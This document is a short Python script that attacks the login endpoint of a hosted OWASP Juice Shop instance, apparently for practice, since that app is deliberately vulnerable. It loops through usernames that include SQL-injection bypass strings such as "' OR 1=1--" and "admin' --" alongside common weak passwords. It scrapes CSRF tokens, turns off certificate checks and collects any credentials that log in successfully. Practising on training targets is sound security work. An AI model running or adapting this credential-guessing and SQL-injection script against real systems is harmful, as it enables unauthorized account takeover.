import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://juice-shop.herokuapp.com/rest/user/login'
csrf_url = 'https://juice-shop.herokuapp.com'
known_usernames = ['admin', 'customer', 'user', "' OR 1=1--", "admin' --", "admin' #"]
password_attempts = ['password', 'admin123', 'letmein', "' or 1=1--"]
user_agent = {'User-Agent': 'Mozilla/5.0'}
session = requests.Session()

def get_csrf_token(session):
    response = session.get(csrf_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_meta_tag = soup.find('meta', {'name': '_csrf'})
    csrf_input_tag = soup.find('input', {'name': '_csrf'})
    if csrf_input_tag:
        return csrf_input_tag['value']
    elif csrf_meta_tag:
        return csrf_meta_tag['content']
    return ''

def validate_login_response(response):
    return response.status_code == 200 and '"authentication":true' in response.text

def enhanced_check_username_enumeration(session):
    headers = {'Content-Type': 'application/json', 'User-Agent': user_agent['User-Agent']}
    found_credentials = []
    for username in known_usernames:
        for password in password_attempts:
            csrf_token = get_csrf_token(session)
            payload = {
                'email': username,
                'password': password,
                '_csrf': csrf_token
            }
            response = session.post(url, json=payload, headers=headers, verify=False)
            if validate_login_response(response):
                found_credentials.append((username, password))
    return found_credentials

print(enhanced_check_username_enumeration(session))
